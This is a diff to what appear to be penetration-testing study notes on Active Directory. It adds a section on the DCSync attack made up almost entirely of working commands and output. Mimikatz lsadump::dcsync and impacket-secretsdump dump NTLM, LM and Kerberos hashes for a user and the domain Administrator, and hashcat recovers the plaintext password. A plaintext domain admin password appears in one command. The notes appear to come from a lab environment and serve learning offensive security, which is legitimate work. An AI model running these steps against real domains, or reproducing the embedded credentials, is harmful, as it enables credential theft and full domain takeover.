@@ -119,6 +119,7 @@ Version: v1.0.3 (9dad6e1) - 09/06/22 - Ronnie Flathers @ropnop
 
 ### impacket-GetNPUsers
 
+{% code title="" overflow="wrap" lineNumbers="true" %}
 ```
  impacket-GetNPUsers -dc-ip 192.168.194.70  -request -outputfile hashes.asreproast corp.com/pete  
  Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -128,6 +129,7 @@ Name  MemberOf  PasswordLastSet             LastLogon                   UAC
 ----  --------  --------------------------  --------------------------  --------
 dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
 ```
+{% endcode %}
 
 {% code title="Obtaining the correct mode for Hashcat" overflow="wrap" lineNumbers="true" %}
 ```
@@ -461,5 +463,85 @@ RawContentLength  : 703
 {% code title="to download the file" overflow="wrap" lineNumbers="true" %}
 ```
 iwr -UseDefaultCredentials http://web04 -Outfile file.html
+```
+{% endcode %}
+
+## DCsync attack
+
+To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+
+### mimikatz
+
+{% code title=" Using Mimikatz to perform a dcsync attack to obtain the credentials of dave" overflow="wrap" lineNumbers="true" %}
+```
+PS C:\Users\jeffadmin> cd C:\Tools\
+
+PS C:\Tools> .\mimikatz.exe
+...
+
+mimikatz # lsadump::dcsync /user:corp\dave
+[DC] 'corp.com' will be the domain
+[DC] 'DC1.corp.com' will be the DC server
+[DC] 'corp\dave' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : dave
+
+** SAM ACCOUNT **
+
+SAM Username         : dave
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
+Account expiration   :
+Password last change : 9/7/2022 9:54:57 AM
+Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
+Object Relative ID   : 1103
+
+Credentials:
+    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
+    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
+    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
+    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
+...
+
+```
+{% endcode %}
+
+{% code title="Using Hashcat to crack the NTLM hash obtained by the dcsync attack" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+...
+08d7a47a6f9f66b97b1bae4178747494:Flowers1              
+...
+```
+{% endcode %}
+
+{% code title="Using Mimikatz to perform a dcsync attack to obtain the credentials of the domain administrator Administrator" overflow="wrap" lineNumbers="true" %}
+```
+mimikatz # lsadump::dcsync /user:corp\Administrator
+...
+Credentials:
+  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
+...
+```
+{% endcode %}
+
+### impacket-secretsdump
+
+{% code title="Using secretsdump to perform the dcsync attack to obtain the NTLM hash of dave" overflow="wrap" lineNumbers="true" %}
+```
+kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
+[*] Kerberos keys grabbed
+dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
+dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
+dave:des-cbc-md5:1a329b4338bfa215
+[*] Cleaning up...
 ```
 {% endcode %}
